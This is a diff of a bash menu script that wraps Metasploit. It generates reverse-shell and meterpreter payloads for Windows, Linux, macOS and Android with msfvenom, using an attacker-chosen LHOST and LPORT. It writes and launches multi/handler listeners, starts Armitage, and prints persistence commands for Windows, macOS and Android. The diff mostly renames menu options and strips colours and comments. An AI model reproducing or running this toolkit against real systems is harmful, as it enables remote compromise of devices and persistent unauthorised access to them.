@@ -1,11 +1,7 @@
 #!/bin/bash
-# etc etc etc
-# ..................
-[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
-#resize -s 30 60
-clear                                   # Clear the screen.
+[[ `id -u` -eq 0 ]] || { echo -e "Must be root to run script"; exit 1; }
+#resize -s 30 60                                   
 SERVICE=service;
-
 if ps ax | grep -v grep | grep metasploit > /dev/null
 then
     echo "$SERVICE service running"
@@ -14,26 +10,16 @@ else
     sudo service metasploit start
 fi 
 mkdir ~/Desktop/temp 
-clear
-clear
 echo -e "SELECT AN OPTION"
 echo -e "1. Create Payload"
-tput sgr0                               # Reset colors to "normal."
 echo -e "2. Start a multi handler"
-tput sgr0
 echo -e "3. Exploit"
-tput sgr0
 echo -e "4. Forge a Persistence script"
-tput sgr0
 echo -e "5. Armitage"
-tput sgr0
 echo -e "6. Kage"
-tput sgr0                               # Reset attributes.
 read options
 case "$options" in
-# Note variable is quoted.
   "1" | "1" )
-  # Accept upper or lowercase input.
 PS3='Enter your choice 6=QUIT: '
 options=("win" "nix" "mac" "droid" "listall" "exit")
 select opt in "${options[@]}"
@@ -54,15 +40,15 @@ do
             msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
             echo -e "\E[1;33m::::: \e[97mshell.macho saved to ~/Desktop/temp\E[1;33m:::::"
             ;;
-        "droir")
+        "droid")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
             echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/Desktop/temp\E[1;33m:::::"
             ;;  
-        "List_All")
+        "listall")
             xterm -e msvenom -l &
             ;;   
-        "Quit")
+        "exit")
             echo "Good Bye" && break
             ;;
         *) echo invalid option;;
@@ -71,14 +57,13 @@ done
  ;;
 
   "2" | "2" )
-echo -e "\E[1;33m::::: \e[97mLets Craft a LISTNER\E[1;33m:::::"
-
+echo -e "LISTNER"
 PS3='Enter your choice 6=QUIT: '
-options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
+options=("win" "mac" "nix" "droid" "listall" "exit")
 select opt in "${options[@]}"
 do
     case $opt in
-        "Windows")
+        "win")
             touch ~/Desktop/temp/meterpreter.rc
             echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
             echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter.rc
@@ -91,7 +76,7 @@ do
             cat ~/Desktop/temp/meterpreter.rc
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
             ;;
-        "Linux")
+        "nix")
             touch ~/Desktop/temp/meterpreter_linux.rc
             echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_linux.rc
             echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter_linux.rc
@@ -105,7 +90,7 @@ do
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter_linux.rc &
             exit
             ;;
-        "Mac")
+        "mac")
             touch ~/Desktop/temp/meterpreter_mac.rc
             echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_mac.rc
             echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_mac.rc
@@ -118,7 +103,7 @@ do
             cat ~/Desktop/temp/meterpreter_mac.rc
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter_mac.rc &
             ;;
-        "Android")
+        "droid")
             touch ~/Desktop/temp/meterpreter_droid.rc
             echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_droid.rc
             echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_droid.rc
@@ -131,13 +116,13 @@ do
             cat ~/Desktop/temp/meterpreter_droid.rc
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
             ;;  
-        "List_All")
+        "listall")
             touch ~/Desktop/temp/payloads.rc
             echo show payloads > ~/Desktop/temp/payloads.rc
             cat ~/Desktop/temp/payloads.rc
             xterm -e msfconsole -r ~/Desktop/temp/payloads.rc &
             ;;   
-        "Quit")
+        "exit")
             echo "Good Bye" && break
             ;;
         *) echo invalid option;;
@@ -147,7 +132,7 @@ done
 
  "3" | "3" )
   # Accept upper or lowercase input.
-  echo -e "\E[1;33m::::: \e[97mStarting Metasploit \E[1;33m:::::"
+  echo -e "Starting Metasploit"
   msfconsole
   use exploit/multi/handler  
 
@@ -156,25 +141,25 @@ done
 
   "4" | "4" )
   # 
-  echo -e "\E[1;33m::::: \e[97mPersistence Generator \E[1;33m:::::"
+  echo -e "Persistence Generator"
  PS3='Enter your choice 5=QUIT: '
- options=("Windows" "Linux" "Mac" "Android" "Quit")
+ options=("win" "nix" "mac" "droid" "exit")
  select opt in "${options[@]}"
  do
     case $opt in
-        "Windows")
+        "win")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             echo -e "\E[1;33m::::: \e[97mrun persistence -U -X 30 -p $userport -r $uservar\E[1;33m:::::"
             ;;
-        "Linux")
+        "nix")
             echo -e "\E[1;33m::::: \e[97mGet creative here :)\E[1;33m:::::"
             ;;
-        "Mac")
+        "mac")
             echo 'Using directory /Applications/Utilities/'
             read -p 'Enter payload file name :example *shell.macho: ' uservar; 
             echo -e "\E[1;33m::::: \e[97mdefaults write /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$uservar”;}’\E[1;33m:::::"
             ;;
-        "Android")
+        "droid")
             touch ~/Desktop/temp/android.sh
             echo \#\!/bin/bash >> ~/Desktop/temp/android.sh
             echo while : >> ~/Desktop/temp/android.sh
@@ -184,7 +169,7 @@ done
             cat ~/Desktop/temp/android.sh
             echo -e "\E[1;33m::::: \e[97mandroid.sh saved to ~/Desktop/temp. Upload to / on device\E[1;33m:::::" 
             ;;  
-        "Quit")
+        "exit")
             echo "Good Bye" && break
             ;;
         *) echo invalid option;;
@@ -194,9 +179,9 @@ done
 
   "5" | "5" )
   # 
-  echo -e "\E[1;33m::::: \e[97mArmitage Launcher \E[1;33m:::::"
+  echo -e "Armitage Launcher"
   echo "armitage should be in /opt/armitage"
-  echo -e "\E[1;33m::::: \e[97mLaunching...\E[1;33m:::::"
+  echo -e "Launching..."
   xterm -e sudo java -jar /opt/armitage/armitage.jar & 
 
 ;;
